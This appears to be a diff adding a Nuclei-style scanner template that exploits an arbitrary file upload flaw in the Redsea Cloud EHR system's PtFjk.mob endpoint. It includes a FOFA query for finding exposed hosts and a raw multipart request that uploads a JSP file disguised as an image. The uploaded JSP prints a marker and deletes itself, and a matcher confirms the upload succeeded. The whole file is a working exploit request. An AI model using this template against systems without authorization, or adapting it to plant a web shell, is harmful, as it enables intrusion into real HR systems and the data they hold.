@@ -1,0 +1,36 @@
+id: redsea-ehr-ptfjkmob-file-upload
+
+info:
+  name: "红海云EHR PtFjk.mob 文件上传任意文件上传漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="RedseaPlatform"
+        红海云EHR系统PtFjk.mob接口存在未经充分验证的文件上传机制，攻击者可利用该漏洞在目标系统中部署恶意负载，可能导致系统权限被篡夺或数据机密性受损。
+        /uploadfile/+URL
+  tags: 红海云
+
+http:
+- raw:
+  - |
+    POST /RedseaPlatform/PtFjk.mob?method=upload HTTP/1.1
+    Host: {{Hostname}}
+    Accept: */*
+    Accept-Encoding: gzip, deflate, br
+    Connection: keep-alive
+    Content-Type: multipart/form-data; boundary=---------------------------3dtd6inedsrglfna4uqp
+
+    -----------------------------3dtd6inedsrglfna4uqp
+    Content-Disposition: form-data; name="fj_file"; filename="NTest.jsp"
+    Content-Type: image/jpeg
+
+    <% out.println("NdayTest"); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+    -----------------------------3dtd6inedsrglfna4uqp--
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'NdayTest'
